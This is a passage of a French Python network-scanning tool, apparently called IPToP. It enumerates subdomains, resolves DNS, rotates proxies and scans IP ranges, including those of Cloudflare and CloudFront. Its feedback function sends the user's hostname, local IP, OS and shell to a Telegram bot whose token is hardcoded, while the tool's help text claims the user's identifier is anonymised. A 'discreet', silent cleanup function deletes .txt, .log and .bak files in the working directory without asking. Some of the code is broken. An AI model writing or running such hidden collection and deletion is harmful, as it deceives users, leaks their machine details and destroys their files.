    print("   > Parfait pour préparer ou analyser des listes personnalisées.")

    print(Fore.CYAN + "\n5. Gérer les proxies :")
    print("   > Met à jour la liste des proxies, les valide et permet d’en sélectionner un manuellement ou automatiquement.")
    print("   > Le mode turbo utilise plus de threads pour des scans rapides.")

    print(Fore.CYAN + "\n6. Scanner Cloudflare :")
    print("   > Scanne les plages CIDR connues de Cloudflare à la recherche d’hôtes exposés.")
    print("   > Gestion de la reprise automatique et historique de scan.")

    print(Fore.CYAN + "\n7. Scanner CloudFront :")
    print("   > Identique à Cloudflare mais ciblé sur les plages IP d’Amazon CloudFront.")

    print(Fore.CYAN + "\n8. Envoyer un message à l’auteur :")
    print("   > Ouvre un champ libre pour donner ton avis, signaler un bug ou poser une question.")
    print("   > Ton identifiant est anonymisé automatiquement.")

    print(Fore.CYAN + "\n9. Lire ce guide :")
    print("   > Ce que tu es en train de lire maintenant.")

    print(Fore.CYAN + "\n10. Lire les réponses du bot :")
    print("   > Affiche les derniers messages d’aide publiés en direct depuis Telegram.")

    print(Fore.CYAN + "\n0. Quitter :")
    print("   > Ferme le programme proprement.")

    print(Fore.YELLOW + "\n===============================\n")

def get_or_create_user_id():
    uid_file = os.path.expanduser("~/.ipt_uid")
    if os.path.exists(uid_file):
        with open(uid_file, "r") as f:
            return f.read().strip()

    raw = platform.node() + platform.machine() + os.getenv("SHELL", "")
    hash_uid = hashlib.sha256(raw.encode()).hexdigest()[:10]

    with open(uid_file, "w") as f:
        f.write(hash_uid)

    return hash_uid

def increment_feedback_count():
    counter_file = os.path.expanduser("~/.ipt_feedback_count")
    count = 0
    if os.path.exists(counter_file):
        try:
            with open(counter_file, "r") as f:
                count = int(f.read().strip())
        except:
            pass
    count += 1
    with open(counter_file, "w") as f:
        f.write(str(count))
    return count

def send_feedback_to_telegram():
    print(Fore.CYAN + "\n📝 Entrez votre message pour l’auteur.")
    print(Fore.YELLOW + "(Appuyez sur Entrée vide pour envoyer)\n")

    lines = []
    while True:
        line = input()
        if not line.strip():
            break
        lines.append(line)

    message = "\n".join(lines).strip()
    if not message:
        return

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        ip_local = socket.gethostbyname(socket.gethostname())
    except:
        ip_local = "inconnue"

    system_id = platform.node() or "non défini"
    system_type = platform.system()
    os_version = platform.release()
    arch = platform.machine()
    shell = os.getenv("SHELL", "inconnu")

    user_id = get_or_create_user_id()
    feedback_count = increment_feedback_count()

    formatted = (
        f"📩 Message utilisateur IPToP\n"
        f"🕒 {now}\n"
        f"🆔 UID : {user_id} | Feedback #{feedback_count}\n"
        f"🌐 IP locale : {ip_local}\n"
        f"🖥️ Appareil : {system_id}\n"
        f"🧠 OS : {system_type} {os_version} | Arch : {arch}\n"
        f"📟 Shell : {shell}\n\n"
        f"{message}"
    )

    BOT_TOKEN = "8011181087:AAHNUut9CCJnqEL0g1k_MCGQsFrd3f668Zk"
    CHAT_ID = "5950978436"

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": formatted
    }

    try:
        r = requests.post(url, data=payload, timeout=10)
        if r.status_code == 200:
            print(Fore.GREEN + "✅ Message envoyé avec succès !")
            print(Fore.CYAN + "\n✉️ Merci pour votre retour.")
    except:
        pass

def clean_unwanted_logs():
    """Nettoie discrètement les fichiers inutiles et anciens du dossier courant."""
    dossier = os.getcwd()
    extensions_cibles = (".log", ".tmp", ".bak", ".txt")
    noms_fixes = {"log_bot", ".ipt_bot.log", "launcher.log", "last_error.txt"}
    maintenant = time.time()
    age_max = 48 * 3600  # 48 heures

    try:
        for nom in os.listdir(dossier):
            chemin = os.path.join(dossier, nom)
            if os.path.isfile(chemin):
                if nom in noms_fixes or nom.endswith(extensions_cibles):
                    age = maintenant - os.path.getmtime(chemin)
                    if age > age_max or nom in noms_fixes:
                        os.remove(chemin)
            elif os.path.isdir(chemin) and nom == "logs":
                for sous_fichier in os.listdir(chemin):
                    try:
                        sf_path = os.path.join(chemin, sous_fichier)
                        if os.path.isfile(sf_path) and (maintenant - os.path.getmtime(sf_path)) > age_max:
                            os.remove(sf_path)
                    except:
                        pass
                try:
                    os.rmdir(chemin)  # Supprime le dossier si vide
                except:
                    pass
    except:
        pass  # Silencieux

def domain_tools_menu():
    print(Fore.MAGENTA + "\n🌐 OUTILS DE RECHERCHE DE DOMAINES")
    print(Fore.MAGENTA + "=" * 45)

    print(Fore.CYAN + " 1. 🔍 Recherche passive (API externes)")
    print(Fore.CYAN + " 2. 🕸️  Analyse de page web")
    print(Fore.CYAN + " 3. 🔗 Combiner les deux méthodes")
    print(Fore.CYAN + " 4. ↩️  Retour au menu principal")

    choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-4) : ")
    return choice

def extract_from_webpage(url, proxy=None):
    """Extrait les domaines et IPs depuis une page web"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    print(Fore.CYAN + f"\n🔍 Analyse de {url}...")
    
    try:
        # Configuration de la requête
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        
        # 1. Récupération du contenu HTML
        response = requests.get(url, headers=headers, proxies=proxies, timeout=15, allow_redirects=True)
        final_url = response.url  # URL finale après redirections
        html_content = response.text
        
        # 2. Extraction des domaines
        domains = set()
        
        # Extraction des URLs complètes
        for attr in ['href', 'src', 'data-src', 'action']:
            matches = re.findall(fr'{attr}=["\'](https?://[^"\']+)["\']', html_content, re.I)
            for match in matches:
                parsed = urllib.parse.urlparse(match)
                if parsed.netloc:
                    domains.add(parsed.netloc.split(':')[0])  # Retire le port si présent
        
        # Extraction des domaines nus
        naked_domains = re.findall(r'(?:https?:)?//([^/"\'\s]+)', html_content)
        for domain in naked_domains:
            domains.add(domain.split(':')[0].split('?')[0])
        
        # 3. Résolution DNS
        ips = set()
        if domains:
            print(Fore.CYAN + "⚡ Résolution DNS en cours...")
            with ThreadPoolExecutor(max_workers=20) as executor:
                futures = {executor.submit(socket.gethostbyname, domain): domain for domain in domains}
                for future in as_completed(futures):
                    try:
                        ips.add(future.result())
                    except:
                        continue
        
        return {
            'url': final_url,
            'domains': sorted(domains),
            'ips': sorted({ip for ip in ips if not ipaddress.ip_address(ip).is_private}),
            'total': len(domains) + len(ips)
        }
        
    except Exception as e:
        print(Fore.RED + f"❌ Erreur lors de l'analyse: {str(e)}")
        return None

def is_valid_domain(domain):
    """Valide strictement un nom de domaine"""
    if not domain or '*' in domain:
        return False
    
    # Vérifie la longueur totale
    if len(domain) > 253:
        return False
    
    # Vérifie chaque partie
    parts = domain.split('.')
    if len(parts) < 2:  # Au moins un sous-domaine et un TLD
        return False
    
    for part in parts:
        if not part or len(part) > 63:
            return False
        if not re.match(r'^[a-z0-9-]+$', part):
            return False
        if part.startswith('-') or part.endswith('-'):
            return False
    
    return True

def find_domains(domain):
    """Recherche robuste de domaines avec gestion d'erreur complète"""
    domains = set()
    domains.add(domain)  # Toujours inclure le domaine principal
    
    print(Fore.CYAN + "\n🔍 Recherche en cours (sources: Hackertarget, crt.sh, Subfinder)...")

    # 1. Hackertarget (source la plus fiable)
    try:
        print(Fore.CYAN + "\n▪ Tentative avec Hackertarget...")
        response = requests.get(
            f"https://api.hackertarget.com/hostsearch/?q={domain}",
            timeout=10
        )
        if response.status_code == 200:
            new_domains = [
                line.split(',')[0].lower().strip() 
                for line in response.text.splitlines() 
                if ',' in line
            ]
            valid_domains = {d for d in new_domains if is_valid_domain(d)}
            domains.update(valid_domains)
            print(Fore.GREEN + f"✓ {len(valid_domains)} domaines valides")
        else:
            print(Fore.YELLOW + f"⚠️ Code {response.status_code} de Hackertarget")
    except Exception as e:
        print(Fore.YELLOW + f"⚠️ Erreur Hackertarget: {str(e)}")

    # 2. crt.sh (source secondaire)
    try:
        print(Fore.CYAN + "\n▪ Tentative avec crt.sh...")
        response = requests.get(
            f"https://crt.sh/?q=%25.{domain}&output=json",
            timeout=15
        )
        if response.status_code == 200:
            new_domains = [
                name.lower().strip()
                for cert in response.json()
                for name in cert.get('name_value', '').split('\n')
                if name and '*' not in name
            ]
            valid_domains = {d for d in new_domains if is_valid_domain(d)}
            domains.update(valid_domains)
            print(Fore.GREEN + f"✓ {len(valid_domains)} domaines valides")
        else:
            print(Fore.YELLOW + f"⚠️ Code {response.status_code} de crt.sh")
    except Exception as e:
        print(Fore.YELLOW + f"⚠️ Erreur crt.sh: {str(e)}")

    # 3. Subfinder (optionnel mais puissant)
    try:
        print(Fore.CYAN + "\n▪ Tentative avec Subfinder...")
        result = subprocess.run(
            ['subfinder', '-d', domain, '-silent'],
            capture_output=True,
            text=True,
            timeout=300
        )
        if result.returncode == 0:
            new_domains = [line.strip().lower() for line in result.stdout.splitlines() if line.strip()]
            valid_domains = {d for d in new_domains if is_valid_domain(d)}
            domains.update(valid_domains)
            print(Fore.GREEN + f"✓ {len(valid_domains)} domaines valides")
        else:
            print(Fore.YELLOW + f"⚠️ Erreur Subfinder (code {result.returncode}): {result.stderr}")
    except FileNotFoundError:
        print(Fore.RED + "❌ Subfinder non installé. Pour l'installer: 'pkg install subfinder'")
    except Exception as e:
        print(Fore.YELLOW + f"⚠️ Erreur Subfinder: {str(e)}")

    # Résultat final filtré
    final_domains = sorted({d for d in domains if is_valid_domain(d)})
    print(Fore.GREEN + f"\n✅ Total de domaines valides: {len(final_domains)}")
    return final_domains
    
def run_subfinder(domain):
    """Exécute Subfinder avec gestion d'erreur détaillée"""
    try:
        result = subprocess.run(
            ['subfinder', '-d', domain, '-silent'],
            capture_output=True,
            text=True,
            timeout=300  # 5 minutes max
        )
        
        if result.returncode != 0:
            raise Exception(f"Erreur Subfinder (code {result.returncode}): {result.stderr}")
            
        return [line.strip().lower() for line in result.stdout.splitlines() if line.strip()]
        
    except FileNotFoundError:
        print(Fore.RED + "❌ Subfinder non installé. Installez-le avec 'pkg install subfinder'")
        return []
    except Exception as e:
        print(Fore.RED + f"❌ Erreur Subfinder: {str(e)}")
        return []
        
def fetch_domains_from_source(url, handler, timeout, source_name):
    """Récupère les domaines depuis une source spécifique"""
    try:
        response = requests.get(url, timeout=timeout)
        response.raise_for_status()
        
        # Ajout du nom de la source pour les logs
        setattr(response, 'source_name', source_name)
        return handler(response)
    except Exception as e:
        setattr(e, 'source_name', source_name)
        raise e

def resolve_and_save_ips(domains, ip_file):
    """Résolution DNS intensive avec vérification"""
    if not domains:
        return set()

    print(Fore.CYAN + f"\n⚡ Résolution DNS avancée pour {len(domains)} domaines...")
    ips = set()

    def resolve(domain):
        try:
            # Essai avec dnspython (plus fiable)
            try:
                answer = dns.resolver.resolve(domain, 'A')
                return str(answer[0])
            except:
                # Fallback sur socket standard
                try:
                    return socket.gethostbyname(domain)
                except socket.gaierror:
                    return None
        except Exception as e:
            if not self.silent:
                print(Fore.YELLOW + f"⚠️ Erreur DNS pour {domain}: {str(e)}")
            return None

    # Résolution en parallèle avec gestion des erreurs
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(resolve, domain): domain for domain in domains}
        
        for future in tqdm(as_completed(futures), total=len(futures), desc="Résolution DNS"):
            ip = future.result()
            if ip and is_valid_ip(ip):
                ips.add(ip)

    # Sauvegarde des IPs valides
    if ips:
        with open(ip_file, 'w') as f:
            f.write("\n".join(sorted(ips, key=lambda x: tuple(map(int, x.split('.'))))))
        print(Fore.GREEN + f"✓ {len(ips)} IPs valides sauvegardées dans {ip_file}")
    else:
        print(Fore.YELLOW + "⚠️ Aucune IP valide résolue")

    return ips

def is_valid_ip(ip):
    """Valide le format d'une adresse IP"""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def manage_domain_scan(domain):
    """Version avec gestion du proxy et mode turbo"""
    domain_file = f"{domain}_domains.txt"
    ip_file = f"{domain}_ips.txt"
    
    # Configuration proxy et turbo
    proxy = None
    turbo = False
    
    while True:
        # Chargement initial des données existantes
        domains = set()
        ips = set()
        
        if os.path.exists(domain_file):
            with open(domain_file, 'r') as f:
                domains = {line.strip() for line in f if line.strip()}
        
        if os.path.exists(ip_file):
            with open(ip_file, 'r') as f:
                ips = {line.strip() for line in f if line.strip()}

        # Affichage du menu
        print(Fore.CYAN + "\n" + "="*40)
        print(Fore.YELLOW + f"Résultats pour {domain}:")
        print(Fore.GREEN + f"- {len(domains)} domaines")
        print(Fore.GREEN + f"- {len(ips)} IPs")
        if proxy:
            print(Fore.MAGENTA + f"- Proxy actif: {proxy}")
        print(Fore.CYAN + "="*40)
        
        print(Fore.MAGENTA + "\nOptions:")
        print(Fore.CYAN + "1. Mettre à jour la liste des domaines")
        print(Fore.CYAN + "2. Résoudre les DNS et trouver les IPs")
        print(Fore.CYAN + "3. Configurer le proxy pour le scan")
        print(Fore.CYAN + "4. Scanner les résultats actuels")
        print(Fore.CYAN + "5. Retour au menu principal")
        
        choice = input(Fore.YELLOW + "Votre choix (1-5): ").strip()
        
        if choice == "1":
            # Option 1 - Mise à jour des domaines
            print(Fore.CYAN + "\n🔍 Mise à jour des domaines en cours...")
            new_domains = find_domains(domain)
            
            if new_domains:
                with open(domain_file, 'w') as f:
                    f.write("\n".join(new_domains))
                print(Fore.GREEN + f"✓ {len(new_domains)} domaines sauvegardés")
                
                # Supprimer les IPs existantes car elles peuvent être obsolètes
                if os.path.exists(ip_file):
                    os.remove(ip_file)
                    print(Fore.YELLOW + "⚠️ Anciennes IPs supprimées (potentiellement obsolètes)")
            else:
                print(Fore.RED + "❌ Aucun nouveau domaine trouvé")
                
        elif choice == "2":  # Scanner depuis fichier
            filename = input("Chemin du fichier contenant IPs/domaines : ").strip()
            
            # Détection automatique du type de contenu
            with open(filename, 'r') as f:
                sample = f.read(1024)
                has_domains = any(c.isalpha() for c in sample)  # Détection plus robuste
        
            if has_domains:
                # Mode AlphaUnix pour les domaines
                workers = min(500, int(input("Nombre de workers (10-500) : ")))
                scanner = AlphaUnixScanner(max_workers=workers)
                scanner.scan_file(filename)
                
                # Export des résultats
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                output_file = f"scan_domaines_{timestamp}.txt"
                with open(output_file, 'w') as f:
                    for r in scanner.results:
                        if not r['error']:
                            f.write(f"{r['domain']} | Status: {r['status']} | Server: {r['server']}\n")
                print(Fore.GREEN + f"\n[+] Résultats sauvegardés dans {output_file}")
            else:
                # Mode original pour les IPs
                threads = int(input("Nombre de threads (max 500) : "))
                proxy = get_proxy_config()
                turbo = False
                if proxy == "auto":
                    turbo = input("Mode turbo pour proxy ? (o/n) : ").lower() == 'o'
                
                scanner = HostScanner(
                    filename=filename,
                    threads=threads,
                    proxy=proxy,
                    turbo_mode=turbo
                )
                scanner.run()
            
        elif choice == "3":
            # Option 3 - Configuration du proxy pour le scan
            proxy_choice = input("Utiliser un proxy pour le scan? (o/n/auto) : ").lower()
            if proxy_choice == 'auto':
                proxy = "auto"
                turbo = input(Fore.CYAN + "Activer le mode turbo pour proxy? (o/n) : ").lower() == 'o'
                print(Fore.CYAN + "🔁 Mode proxy automatique activé" + (" avec turbo" if turbo else ""))
            elif proxy_choice == 'o':
                proxy_choice = input("1. Entrer manuellement\n2. Choisir depuis le fichier\nChoix (1/2) : ")
                if proxy_choice == "1":
                    proxy = input("URL du proxy (ex: http://123.45.67.89:8080) : ")
                elif proxy_choice == "2":
                    proxy = select_proxy_interactive()
            else:
                proxy = None
                turbo = False
                print(Fore.CYAN + "Proxy désactivé pour le scan")
        
        elif choice == "4":
            # Option 4 - Scanner les résultats avec gestion du proxy et turbo
            targets = []
            if os.path.exists(domain_file):
                with open(domain_file, 'r') as f:
                    targets.extend(line.strip() for line in f if line.strip())
            
            if os.path.exists(ip_file):
                with open(ip_file, 'r') as f:
                    targets.extend(line.strip() for line in f if line.strip())
            
            if not targets:
                print(Fore.RED + "❌ Aucune cible à scanner")
                continue
                
            temp_file = "temp_scan.txt"
            with open(temp_file, 'w') as f:
                f.write("\n".join(targets))
            
            # Configuration du scanner avec le proxy et turbo
            scanner = HostScanner(
                filename=temp_file,
                threads=100 if turbo else 50,  # Plus de threads en mode turbo
                proxy=proxy,
                turbo_mode=turbo
            )
            
            if proxy == "auto":
                mode = "automatique" + (" avec turbo" if turbo else "")
                print(Fore.CYAN + f"\n⚡ Scan avec rotation {mode}")
                threading.Thread(target=monitor_proxy_usage, args=(scanner,), daemon=True).start()
            elif proxy:
                print(Fore.CYAN + f"\n⚡ Scan avec proxy fixe: {proxy}" + (" (turbo)" if turbo else ""))
            else:
                print(Fore.CYAN + "\n⚡ Scan sans proxy")
                
            scanner.run()
            os.remove(temp_file)
            
        elif choice == "5":
            # Option 5 - Retour
            print(Fore.CYAN + "\nRetour au menu principal...")
            break
            
        else:
            print(Fore.RED + "❌ Option invalide. Veuillez réessayer.")
            
def show_scan_menu():
    """Affiche le menu des options de scan"""
    print(Fore.MAGENTA + "\nOptions:")
    print(Fore.CYAN + "1. Mettre à jour la liste des domaines")
    print(Fore.CYAN + "2. Résoudre les DNS et trouver les IPs")
    print(Fore.CYAN + "3. Scanner les résultats actuels")
    print(Fore.CYAN + "4. Retour au menu principal")
    return input(Fore.YELLOW + "Votre choix (1-4): ").strip()

def update_domains(domain, domain_file, ip_file):
    """Force la mise à jour de la liste des domaines"""
    print(Fore.CYAN + "\n🔍 Mise à jour des domaines...")
    try:
        os.remove(domain_file)
        os.remove(ip_file) if os.path.exists(ip_file) else None
    except Exception as e:
        print(Fore.YELLOW + f"⚠️ Erreur lors de la suppression des fichiers: {str(e)}")

def resolve_domain(domain):
    """Résout un seul domaine en IP"""
    try:
        socket.setdefaulttimeout(3)
        return socket.gethostbyname(domain)
    except:
        return None

def run_scan(targets):
    """Lance le scan des cibles"""
    temp_file = "temp_scan.txt"
    try:
        with open(temp_file, 'w') as f:
            f.write("\n".join(targets) + "\n")
        
        print(Fore.CYAN + "\n⚡ Préparation du scan...")
        scanner = HostScanner(filename=temp_file)
        scanner.run()
    finally:
        if os.path.exists(temp_file):
            os.remove(temp_file)

def get_domains_and_ips(domain):
    """Récupère uniquement les domaines associés"""
    print(Fore.CYAN + f"\n🔍 Recherche des domaines pour {domain}...")
    
    # Vérifier le cache
    cache_file = f"{domain}_domains.txt"
    if os.path.exists(cache_file):
        print(Fore.GREEN + "✓ Chargement depuis le cache existant...")
        with open(cache_file, 'r') as f:
            domains = {line.strip() for line in f if line.strip()}
        return sorted(domains), []  # Retourne une liste d'IPs vide
    
    domains = set()
    
    # Sources disponibles
    sources = [
        {
            'name': 'Hackertarget',
            'url': f"https://api.hackertarget.com/hostsearch/?q={domain}",
            'handler': lambda r: [line.split(',')[0].lower().strip() 
                               for line in r.text.splitlines() if ',' in line]
        },
        {
            'name': 'crt.sh',
            'url': f"https://crt.sh/?q=%25.{domain}&output=json",
            'handler': lambda r: [name.lower().strip() 
                                for cert in r.json() 
                                for name in cert.get('name_value', '').split('\n')
                                if name and '*' not in name and domain in name]
        }
    ]
    
    for source in sources:
        try:
            print(Fore.CYAN + f"▪ Interrogation de {source['name']}...")
            response = requests.get(source['url'], timeout=15)
            if response.status_code == 200:
                domains.update(d for d in source['handler'](response) if d)
        except Exception as e:
            print(Fore.YELLOW + f"⚠️ Erreur avec {source['name']}: {str(e)}")
            continue
    
    # Sauvegarde initiale dans le cache
    if domains:
        domains.add(domain)  # Ajout du domaine principal
        with open(cache_file, 'w') as f:
            f.write("\n".join(sorted(domains)))
        print(Fore.GREEN + f"✓ {len(domains)} domaines sauvegardés dans {cache_file}")
    
    return sorted(domains), []  # Retourne une liste d'IPs vide

def resolve_and_scan(domains, proxy=None):
    """Résolution DNS et scan des résultats"""
    if not domains:
        print(Fore.RED + "❌ Aucun domaine à résoudre")
        return []
    
    print(Fore.CYAN + f"\n⚡ Résolution DNS de {len(domains)} domaines...")
    ips = set()
    
    def resolve(domain):
        try:
            socket.setdefaulttimeout(3)
            return socket.gethostbyname(domain)
        except:
            return None
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(resolve, domain): domain for domain in domains}
        for future in tqdm(as_completed(futures), total=len(futures), desc="Résolution"):
            ip = future.result()
            if ip:
                ips.add(ip)
    
    # Sauvegarde des IPs
    if ips:
        ip_file = f"{domain}_ips.txt"
        with open(ip_file, 'w') as f:
            f.write("\n".join(sorted(ips)))
        print(Fore.GREEN + f"✓ {len(ips)} IPs sauvegardées dans {ip_file}")
    
    return sorted(ips)

def main_scan_flow(domain, proxy=None):
    """Flux principal de scan"""
    # Étape 1: Récupération des domaines
    domains, _ = get_domains_and_ips(domain)  # On ignore les IPs ici
    
    if not domains:
        return [], []
    
    # Étape 2: Demande de résolution DNS
    if input(Fore.YELLOW + "\nVoulez-vous résoudre les DNS et scanner? (o/n) : ").lower() == 'o':
        ips = resolve_and_scan(domains, proxy)
        return domains, ips
    
    return domains, []

def resolve_domains(domains, proxy=None):
    """Résolution DNS uniquement lorsque demandé"""
    if not domains:
        return []
    
    print(Fore.CYAN + f"\n⚡ Résolution DNS de {len(domains)} domaines...")
    ips = set()
    
    def resolve(domain):
        try:
            socket.setdefaulttimeout(3)
            return socket.gethostbyname(domain)
        except:
            return None
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(resolve, domain): domain for domain in domains}
        for future in tqdm(as_completed(futures), total=len(futures), desc="Résolution"):
            ip = future.result()
            if ip:
                ips.add(ip)
    
    return sorted(ips)

def scan_domains(domain, proxy=None):
    """Fonction complète avec gestion du cache et résolution optionnelle"""
    # 1. Récupération des domaines
    domains = get_domains_and_ips(domain)
    
    if not domains:
        print(Fore.RED + "❌ Aucun domaine trouvé")
        return [], []
    
    # 2. Demande de résolution DNS
    if input(Fore.YELLOW + "\nVoulez-vous résoudre les DNS et scanner? (o/n) : ").lower() == 'o':
        ips = resolve_domains(domains, proxy)
        
        # Sauvegarde des IPs
        ip_file = f"{domain}_ips.txt"
        with open(ip_file, 'w') as f:
            f.write("\n".join(ips))
        print(Fore.GREEN + f"✓ {len(ips)} IPs sauvegardées dans {ip_file}")
        
        return domains, ips
    
    return domains, []
    
def load_from_cache(filename):
    """Charge les résultats depuis un fichier cache"""
    domains = set()
    ips = set()
    
    with open(filename, 'r') as f:
        current_section = None
        for line in f:
            line = line.strip()
            if line.startswith('# Domaines:'):
                current_section = 'domains'
            elif line.startswith('# IPs:'):
                current_section = 'ips'
            elif line and current_section == 'domains':
                domains.add(line)
            elif line and current_section == 'ips':
                ips.add(line)
    
    return sorted(domains), sorted(ips)

def save_to_cache(filename, domains, ips):
    """Sauvegarde les résultats dans un fichier cache"""
    with open(filename, 'w') as f:
        f.write(f"# Fichier cache pour {os.path.basename(filename).replace('.txt', '')}\n")
        f.write(f"# Dernière mise à jour: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        f.write("# Domaines:\n")
        f.write("\n".join(sorted(domains)))
        f.write("\n\n# IPs:\n")
        f.write("\n".join(sorted(ips)))
    
    print(Fore.GREEN + f"\n✓ Résultats sauvegardés dans {filename}")

def update_cache(domain, new_domains, new_ips):
    """Met à jour un fichier cache existant"""
    cache_file = f"{domain}.txt"
    if not os.path.exists(cache_file):
        return save_to_cache(cache_file, new_domains, new_ips)
    
    # Charger les anciennes données
    old_domains, old_ips = load_from_cache(cache_file)
    
    # Fusionner et nettoyer les données
    updated_domains = set(old_domains).union(new_domains)
    updated_ips = set(old_ips).union(new_ips)
    
    # Resauvegarder
    save_to_cache(cache_file, updated_domains, updated_ips)
    
def bulk_dns_resolve(domains, timeout=3, max_workers=50):
    """Résolution DNS parallèle avec gestion d'erreur"""
    resolved = {}
    
    def resolve(domain):
        try:
            socket.setdefaulttimeout(timeout)
            answers = socket.getaddrinfo(domain, None)
            return domain, list({answer[4][0] for answer in answers})
        except:
            return domain, []

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(resolve, domain): domain for domain in domains}
        for future in as_completed(futures):
            domain, ip_list = future.result()
            if ip_list:
                resolved[domain] = ip_list

    return resolved

def save_and_clean_results(domains, ips, domain):
    """Sauvegarde et nettoie les résultats"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"scan_{domain}_{timestamp}.txt"
    
    # Nettoyage final
    domains = sorted({d.lower().strip() for d in domains if d and '*' not in d})
    ips = sorted({ip.strip() for ip in ips if ip and ip.replace('.', '').isdigit()})
    
    with open(filename, 'w') as f:
        f.write(f"# Résultats pour {domain} - {timestamp}\n\n")
        f.write("# Domaines valides:\n")
        f.write("\n".join(domains) + "\n\n")
        f.write("# IPs valides:\n")
        f.write("\n".join(ips) + "\n")
    
    print(Fore.GREEN + f"\n✅ Résultats sauvegardés dans {filename}")
    print(Fore.CYAN + f"📋 Total: {len(domains)} domaines et {len(ips)} IPs valides")
    
    return filename
    
# ==============================================
# FONCTION PRINCIPALE
# ==============================================

def get_proxy_config():
    """Gère la configuration des proxies de manière centralisée"""
    use_proxy = input("Utiliser un proxy? (o/n/auto) : ").lower()
    proxy = None
    
    if use_proxy == 'auto':
        proxy = "auto"
        print(Fore.CYAN + "🔁 Mode proxy automatique activé avec rotation")
    elif use_proxy == 'o':
        proxy_choice = input("1. Entrer manuellement\n2. Choisir depuis le fichier\nChoix (1/2) : ")
        if proxy_choice == "1":
            proxy = input("URL du proxy (ex: http://123.45.67.89:8080) : ")
        elif proxy_choice == "2":
            proxy = select_proxy_interactive()
    
    return proxy

def main():
    while True:
        choice = main_menu()
        
        if choice == "1":  # Scanner une plage IP
            ip_range = input("Entrez la plage IP (ex: 192.168.1.0/24) : ")
            threads = int(input("Nombre de threads (max 500) : "))
            
            proxy = get_proxy_config()
            turbo = False
            
            if proxy == "auto":
                turbo = input(Fore.CYAN + "Activer le mode turbo pour proxy? (o/n) : ").lower() == 'o'
            
            print(Fore.YELLOW + "\nContrôles: p=pause, r=reprise, s=stop")
            scanner = HostScanner(
                ip_range=ip_range,
                threads=threads,
                proxy=proxy,
                turbo_mode=turbo  # Ici le paramètre est bien passé
            )
            scanner.run()
            
            if scanner.results["Up"]:
                if input("Re-scanner les hôtes actifs ? (o/n) : ").lower() == 'o':
                    # Utilisez la nouvelle méthode de re-scan
                    scanner.last_up_hosts = [host[0] for host in scanner.active_hosts]
                    scanner.rescan_active_hosts()
                    
        elif choice == "2":  # Scanner depuis fichier
            filename = input("Chemin du fichier contenant les hôtes : ")
            threads = int(input("Nombre de threads (max 500) : "))
            
            proxy = get_proxy_config()
            turbo = False
            
            if proxy == "auto":
                turbo = input(Fore.CYAN + "Activer le mode turbo pour proxy? (o/n) : ").lower() == 'o'
            
            print(Fore.YELLOW + "\nContrôles: p=pause, r=reprise, s=stop")
            scanner = HostScanner(
                filename=filename,
                threads=threads,
                proxy=proxy,
                turbo_mode=turbo  # Ajouté ici aussi
            )
            scanner.run()
            
            if scanner.results["Up"]:
                if input("Re-scanner les hôtes actifs ? (o/n) : ").lower() == 'o':
                    # Utilisez la nouvelle méthode de re-scan
                    scanner.last_up_hosts = [host[0] for host in scanner.active_hosts]
                    scanner.rescan_active_hosts()
        
        elif choice == "3":  # Outils de recherche de domaines
            while True:
                sub_choice = domain_tools_menu()
                
                if sub_choice == "1":  # Recherche passive
                    domain = input(Fore.YELLOW + "Entrez le domaine à analyser (ex: example.com) : ").strip()
                    if domain:
                        manage_domain_scan(domain)
                    else:
                        print(Fore.RED + "❌ Veuillez entrer un domaine valide")
                
                elif sub_choice == "2":  # Analyse de page web
                    url = input(Fore.YELLOW + "Entrez l'URL à analyser (ex: https://example.com) : ").strip()
                    if not url:
                        print(Fore.RED + "❌ Veuillez entrer une URL valide")
                        continue
                        
                    if not url.startswith(('http://', 'https://')):
                        url = 'http://' + url
                    
                    # Configuration proxy et turbo
                    proxy = None
                    turbo = False
                    
                    proxy_choice = input("Utiliser un proxy pour le scan des résultats? (o/n/auto) : ").lower()
                    if proxy_choice == 'o':
                        proxy_choice = input("1. Entrer manuellement\n2. Choisir depuis le fichier\nChoix (1/2) : ")
                        if proxy_choice == "1":
                            proxy = input("URL du proxy (ex: http://123.45.67.89:8080) : ")
                        elif proxy_choice == "2":
                            proxy = select_proxy_interactive()
                    elif proxy_choice == 'auto':
                        proxy = "auto"
                        turbo = input(Fore.CYAN + "Activer le mode turbo pour proxy? (o/n) : ").lower() == 'o'
                    
                    # Extraction sans proxy
                    print(Fore.CYAN + "\n⏳ Analyse en cours...")
                    results = extract_from_webpage(url, proxy=None)
                    
                    if results:
                        print(Fore.GREEN + "\n📊 Résultats de l'analyse:")
                        print(Fore.CYAN + f"URL analysée: {results['url']}")
                        print(Fore.YELLOW + f"Domaines trouvés ({len(results['domains'])}):")
                        print("\n".join(results['domains'][:5]))
                        if len(results['domains']) > 5:
                            print(Fore.CYAN + f"... et {len(results['domains'])-5} autres")
                        
                        print(Fore.YELLOW + f"\nIPs résolues ({len(results['ips'])}):")
                        print("\n".join(results['ips'][:5]))
                        if len(results['ips']) > 5:
                            print(Fore.CYAN + f"... et {len(results['ips'])-5} autres")
                        
                        # Sauvegarde des résultats
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        clean_domain = urlparse(url).netloc.replace('.', '_')
                        filename = f"webscan_{clean_domain}_{timestamp}.txt"
                        with open(filename, 'w') as f:
                            f.write(f"Résultats de l'analyse de {url}\n\n")
                            f.write("DOMAINES:\n" + "\n".join(results['domains']) + "\n\n")
                            f.write("IPs:\n" + "\n".join(results['ips']) + "\n")
                        print(Fore.GREEN + f"\n✅ Résultats sauvegardés dans {filename}")
                        
                        # Scan optionnel avec proxy si configuré
